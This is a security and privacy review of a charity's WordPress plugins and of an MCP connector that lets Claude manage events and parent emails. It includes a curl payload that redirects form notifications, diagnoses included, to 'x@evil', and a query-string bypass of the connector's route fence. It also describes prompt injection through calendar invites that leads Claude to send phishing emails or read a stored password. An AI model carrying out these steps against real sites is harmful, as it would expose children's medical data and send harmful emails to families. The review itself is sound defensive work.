# Security and privacy review: fence, connector, plugin (14 Oct 2026)

## Verdict

**Do not connect Claude to the live site yet.** The connector's tools, as written, do not reach entries, contacts or bookings. No tool argument was found that changes a route, and `npm test` passes 55/55. But the design depends on two other promises, and both fail:

1. The WordPress account is not least privilege. The plugin permissions listed in the install notes let that account turn on a copy of every future sign-up, diagnosis included, and read guardians' contact details. The install notes call these permissions "the real boundary" against a leaked password. They are not a boundary.
2. "Nothing reaches a family without Matt's approval" depends only on Claude choosing to wait. The server never checks that Matt approved anything.

The fence itself also has a query-string bypass. No tool can trigger it today, but the fence does not do what its comments claim.

## Critical

### C1. The agent account's plugin permissions can copy out every diagnosis (CONFIRMED by code trace)

- **What:** the install notes gives `claude-agent` these permissions:
  - Fluent Forms "Manage Forms" (`fluentform_forms_manager`).
  - FluentCRM "View emails" plus "Write and send emails".
  - FluentBooking "Manage Other Users Calendars".
- **Where:** on Matt's versions (`site/plugins-cache-matt`):
  - Fluent Forms: `app/Http/Routes/api.php:37-55` (`/settings/{form_id}`) and `:104-113` (`/integrations/{form_id}`) are both under `FormPolicy::verifyRequest`, which needs only `fluentform_forms_manager` (`app/Http/Policies/FormPolicy.php`). `SettingsService::store` (`app/Services/Settings/SettingsService.php:182`) writes any `meta_key`, including `notifications`.
  - FluentCRM: `CampaignPolicy` lets any GET through with `fcrm_read_emails`. `CampaignController::campaignEmails` (`:294`) and `campaign(?viewCampaign)` (`:250`) return each recipient's subscriber record.
  - FluentBooking: `CalendarPolicy` lets `manage_other_calendars` call `POST /calendars/{id}/events/{eid}/email-notifications` (`CalendarController.php:812`). The notification handler honours `additional_recipients` (`NotificationHandler.php:149`).
- **Proof:** with the app password, a `curl` that skips the connector works:
  - `POST /?rest_route=/fluentform/v1/settings/5` with `meta_key=notifications` and `value={"sendTo":{"type":"email","email":"x@evil"},"message":"{all_data}","enabled":true,...}`. Every later sign-up (child's name, age, **diagnosis**) is then emailed out.
  - `GET /?rest_route=/fluent-crm/v2/campaigns/{id}/emails` lists the guardians who received a reminder.
- **How the password leaks:** the Claude Code path in the install notes (`claude mcp add -e SMA_WP_APP_PASSWORD=…`) stores the password in plain text in `~/.claude.json`. Claude Code can read that file with its own Read/Bash tools, so a prompt-injected session goes straight past the fence. A leaked password does the same.
- **Not tested:** the restricted account was never tried. `local.mjs` connects as **admin** (`site/dev/.local-credentials-9400.json`), and nothing in `site/dev` or `connector/wordpress/test` creates `sma_agent`. The note "smoke test passed on his versions" was proved as admin.
- **Impact:** diagnoses of all future sign-ups, plus guardian names and emails.
- **Fix:**
  - Don't grant Fluent Forms "Manage Forms". Let the plugin own the event dropdown, which it already fills at render time (`event-record.php` `sma_events_fill_dropdown`), and drop `set_dropdown_options`.
  - Don't grant FluentCRM "View emails". Schedule reminders through a narrow `sma/v1` route that the plugin implements, so the account needs only `edit_sma_events`.
  - Do the same for booking: an `sma/v1` route instead of FluentBooking permissions.
  - Never put the password in `claude mcp add -e`. Use the `.mcpb`, which keeps it in the OS keychain, or an env file outside Claude's reach.
  - Add a test that runs the connector as an `sma_agent` user and checks that forbidden routes return 403.

## High

### H1. Matt's approval is advisory only (CONFIRMED)

- **Where:** `reminders.js:54,118` and `booking.js:32` (`apply` is a model-supplied boolean). `publish_booking_session` (`booking.js:94`) and `unschedule_reminder` (`reminders.js:152`) have no preview at all.
- **Proof:** in one turn, Claude can call `create_reminder_drafts{apply:true}` and then `schedule_reminder{apply:true, send_at: <in 5 minutes>}`. Every family tagged for that event then gets a So Many Angels email with any subject and body, links included.
- **How it happens:** a prompt injection from any content Claude reads, such as Google Calendar invites, web pages or files Matt shares.
- **Impact:** phishing or distressing messages sent to parents of children with cancer, from the charity's own domain.
- **Fix:** make sends require a second factor Claude cannot supply. Options: create campaigns as drafts only, and have Matt click "schedule" in FluentCRM; or have the plugin email Matt a one-time confirm link that a server route checks. Keep `apply` for previews only.

### H2. The fence has a query-string bypass and gaps in its body rules (CONFIRMED with `checkFence`/`checkBody`; not reachable through the current tools)

- **Where:** `wp.js:117-118`. `BLOCKED` is tested against the path only. At `wp.js:143`, the query is appended raw after `?rest_route=`.
- **Proof:**
  - `checkFence('GET','/wp/v2/pages?rest_route=/fluentform/v1/submissions')` → **PASS**. The request becomes `/?rest_route=/wp/v2/pages&rest_route=/fluentform/v1/submissions`, and PHP uses the last duplicate key.
  - The same trick turns `POST /fluentform/v1/forms/5?rest_route=/fluentform/v1/settings/5` into a settings write.
  - PHP URL-decodes query key names, so `?wit%68[]=emails` and `?viewCampaig%6E=1` get past `BLOCKED_QUERY` (`wp.js:45`).
  - `checkBody` accepts `draft-recipients` with `{subscribers:[{list:'all',tag:1}], sending_filter:'dynamic_segment', dynamic_segment:{...}}`. FluentCRM 3.1.8 `draftRecipients` (`CampaignController.php:468-497`) uses `sending_filter`/`dynamic_segment`/`advanced_filters`, so that request means **all contacts**.
  - `checkBody` also accepts `scheduled_at` dates in the past (immediate send), and `PUT /campaigns/{id}` with recipient keys other than `settings`.
- **Impact:** today, none; every route and body in the tools is fixed. It matters as soon as a tool passes a caller's string into a query, or someone reuses `wp()`.
- **Fix:**
  - Reject any query containing `rest_route`.
  - Parse the query with `URLSearchParams`, decode it, and test key names against an allow-list per route, rather than block-listing them.
  - Send `path` as `encodeURIComponent`.
  - The `draft-recipients` rule should require `sending_filter === 'list_tag'` and reject `dynamic_segment` and `advanced_filters`.
  - The schedule rule should require a future time.

## Medium

### M1. Anyone can rewrite a family's CRM record and attach their own child's data to it (CONFIRMED trace in the plugin; FluentCRM update behaviour PLAUSIBLE)

- **Where:** `registration.php:236-297`. The public form calls `createOrUpdate` on the email address supplied, overwrites first name, last name and phone, and sets `sma_signups[slug]`/`sma_last_entry_id` to the new entry.
- **Proof:** submit the public form with a known guardian's email, a new phone number, and any "child name".
- **Impact:**
  - The dashboard and CSV now show the attacker's entry (child name, age, costume) under the real family.
  - The approval email greets the attacker-supplied child name.
  - Matt may call the attacker's phone number.
  - An acknowledgement email with attacker-chosen text goes to the real parent.
- **Fix:** don't update the name or phone of an existing contact from an unauthenticated form. Instead, record a "details changed" note, and only link the new entry after the email has been confirmed (Fluent double opt-in).

### M2. The diagnosis rule fails open (CONFIRMED in code, PLAUSIBLE in practice)

- **Where:**
  - `registration.php:100-103`: the deny list is the literal names `diagnosis` and `input_text_1`.
  - `dashboard.php:166-169` and `registration.php:87-92`: the allow-lists use Fluent's generic names, `input_text` and `input_text_2`.
  - `sma_entry_child_first_name` (`registration.php:154-171`) does not apply the deny list at all.
- **Impact:** if Matt rebuilds or duplicates the form, Fluent renames the fields. The diagnosis can then land in `input_text` or `input_text_2`. From there it shows on the dashboard, goes into the CSV for Google Sheets, and goes into the automatic acknowledgement and approval emails as the "child's first name".
- **Fix:** at runtime, resolve fields from the form structure by label. Refuse to read any field whose label or admin label matches `/diagnos|medical|condition/i`. Fail closed (blank) when the expected labels don't match.

### M3. Child names are stored in the CRM, against the stated rule (CONFIRMED)

- **Where:** `approval.php:151-159` and `dashboard.php` `sma_dash_decline_no_event`. The decline draft, which contains `{{child_first_name}}`, is saved as a FluentCRM contact note.
- **Impact:** this contradicts "Nothing about the child goes into the CRM" (`registration.php:233`). Anyone with FluentCRM contact access can now read children's names.
- **Fix:** keep drafts in plugin storage that only `sma_manage_families` can read, or render them on demand.

### M4. Every Editor automatically gets access to children's data (CONFIRMED)

- **Where:** `event-record.php:115` grants `sma_manage_families` to every `editor`.
- **Impact:** on a charity site, editors are often volunteers who write blog posts. They would get the dashboard and the CSV export of children.
- **Fix:** grant the capability to administrators only. Give it to other people by name.

### M5. Dev mu-plugins ship in the kit (PLAUSIBLE)

- **Where:** `site/dev/mu/*` is included in the zip (`tools/pack_kit.py` does not exclude it).
- **Impact if someone copies them to the live site:**
  - `sma-dev-mail-log.php` silently swallows **all** site email (approval emails, password resets) and still reports success. It also keeps every message body in `wp_options`, which would include a Fluent notification carrying `{all_data}`.
  - `sma-dev-debug-log.php` writes `wp-content/debug.log` at `E_ALL`. Apache on IONOS serves that file publicly by default.
  - `sma-local-dev.php` allows application passwords over plain http.
- **Fix:**
  - Exclude `site/dev/mu` from the kit, or add a guard at the top of each file, such as `if (!in_array(parse_url(home_url(), PHP_URL_HOST), ['127.0.0.1','localhost'], true)) return;`.
  - Move `debug.log` outside the web root.

## Low

- **L1. Claude-written event text goes out without review (CONFIRMED).**
  - `city`, `venue`, `address` and `canvas_handover` from `save_event` go into the automatic `family-received` email (`registration.php:307-311`) and into approval emails. Matt never sees that text when he approves a family.
  - Escaping is correct: templates use `esc_html`, and emails apply `wp_strip_all_tags`. So this is a content problem, not XSS.
  - Fix: show the rendered email in the `save_event` preview.
- **L2. Notification emails can bring the diagnosis to Claude (PLAUSIBLE).** If Matt's Fluent admin notification or FluentBooking host email carries the diagnosis, any Claude mail connector he enables reads it. That bypasses "Claude never reads family records". R25 checks the notification for email exposure only. Extend the check to cover this.
- **L3. Supply chain (CONFIRMED).**
  - `site/start.sh:31` runs `npx -y @wp-playground/cli@latest`, which is unpinned.
  - `setup.sh:59` downloads plugin zips with no checksum.
  - The email asks Matt to run `curl … | bash`. That is an official installer, but it trains a habit.
  - Fix: pin the versions and check SHA-256 hashes.
- **L4. CSV formula guard misses a case (CONFIRMED).** `export.php:132` misses a leading `\n` and does not neutralise `;` or `|`. The risk is small because `sanitize_text_field` strips newlines.
- **L5. The local demo may be reachable from the network (PLAUSIBLE).** It runs as `admin/password` with app passwords over http. Check that Playground binds to 127.0.0.1 only. The data is fictional (`FICTIONAL-TEST`).

## Verified as holding

- Every tool builds its routes from integers and fixed strings. `list_pages` search goes through `URLSearchParams`. `zod` strips unknown keys, so `save_event` cannot write `booking_url` or `crm_tag_id`.
- Path encoding tricks (`%2F`, `//`, `..`, case changes) fail: `encodeURI` turns `%` into `%25`, and `ALLOWED` is anchored.
- Prior findings checked: R5 (booking meta hidden from the public), R7, R8, R14 and R23 are fixed as described.
- Dashboard and admin-post handlers check the capability and a nonce, and the views escape their output.
- All raw `$wpdb` queries are prepared.
- Option labels cannot carry XSS: the agent has no `unfiltered_html`, so Fluent's `Updater::sanitizeFields` applies.
